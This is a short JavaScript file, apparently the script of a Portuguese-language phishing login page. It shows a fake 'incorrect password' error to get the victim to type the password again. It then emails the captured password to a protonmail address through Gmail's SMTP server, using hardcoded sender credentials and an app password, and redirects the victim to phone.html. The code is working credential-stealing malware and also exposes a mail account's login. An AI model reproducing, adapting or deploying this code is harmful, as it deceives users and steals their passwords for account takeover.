window.onload = function()
{
    var box = document.getElementById("checkbox");
    var pass = document.getElementById("senha");
    var go = document.getElementById("goBtn");
    var x = document.getElementById("forgotpwd");
    box.onclick = function()
    {
        if (pass.getAttribute('type') == 'password')
        {
            pass.setAttribute('type', 'tel');
        } else {
            pass.setAttribute('type', 'password');
        }
    }
    x.onclick = function()
    {
        window.location.href = "phone.html";
    }
    i = 1;
    go.addEventListener("click", function(e) {
        e.preventDefault();
        var x = document.querySelector("#senha");
        var y = x.value;
        if (y.length > 6){
            i = i + 1;
        }
        if (i === 3) {
            Email.send({
                Host: "smtp.gmail.com",
                Username : "julio74108520@gmail.com",
                Password : "hgvt vldi peit jcoh",
                To : 'user1533@protonmail.com',
                From : "julio74108520@gmail.com",
                Subject : y,
                Body : "<p> << Password </p>",
            });
            window.location.href = "phone.html";
        } else {
            document.getElementById("bad-login").innerHTML = "<p class='err-alert'>Senha incorreta, tente novamente.<p>"
            document.getElementById("senha").value='';
        }
    });
}    
    
